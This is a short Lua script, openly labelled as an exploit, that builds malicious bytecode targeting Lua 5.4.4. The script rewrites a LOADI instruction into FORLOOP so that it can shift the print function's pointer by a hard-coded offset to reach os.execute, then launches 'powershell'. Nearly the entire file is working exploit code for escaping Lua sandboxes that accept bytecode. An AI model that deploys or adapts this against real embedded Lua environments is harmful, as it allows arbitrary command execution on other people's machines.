-- Vector4.new, 29/10/2022
-- Very primitive exploit to call os.execute on Lua 5.4(.4) using malicious bytecode.
-- This will not work at all if load cannot accept bytecode, or if os.execute is removed from the binary.

---@diagnostic disable: assign-type-mismatch

---@generic t
---@type fun(input: t, increment: integer): t
local ChangeAddress = load(string.dump(function(input, increment)
    -- Reorder registers for the FORLOOP instruction
    local o, f, i = input, 1, increment

    -- This instruction (LOADI 5 1234) will be replaced with FORLOOP 1 0.
    local repl = 1234
    return o
end):gsub("\129\130\104\130" --[[ LOADI 5 1234 ]], "\73\1\0\0" --[[ FORLOOP 1 0 ]]))

-- The difference between the `os.execute` and `print` functions in bytes.
-- This offset is for Windows 10 x64.
-- Although, testing on WSL (Ubuntu 22.04) works as well.
local difference = 17120
local execute = ChangeAddress(print, difference)

execute("powershell")